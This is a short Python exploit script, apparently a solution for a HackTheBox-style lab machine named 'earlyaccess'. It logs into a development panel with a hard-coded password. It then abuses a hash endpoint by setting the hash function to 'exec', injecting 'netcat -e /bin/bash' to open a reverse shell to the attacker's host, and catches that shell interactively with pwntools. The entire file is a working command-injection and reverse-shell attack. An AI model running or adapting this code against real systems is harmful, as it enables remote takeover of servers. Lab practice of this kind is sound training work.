#!/usr/bin/python3
from pwn import *

if len(sys.argv) < 2:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <lhost>\n")
    exit(1)

with open("/etc/hosts", "a") as file:
    file.write("10.10.11.110 dev.earlyaccess.htb")

target = "http://dev.earlyaccess.htb/actions/"

def login():
    data = {"password" : "gameover"}
    requests.post(target + "login.php", data=data, verify=False)

def cmd():
    time.sleep(2)
    rev = {
        "action": "hash",
        "password": f"netcat -e /bin/bash {sys.argv[1]} 443",
        "hash_function": "exec",
        "debug": 1
    }

    requests.post(target + "hash.php", data=rev, verify=False)

login()

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=60).wait_for_connection()
shell.sendline(b"export HOME=/var/www TERM=xterm")
shell.interactive()
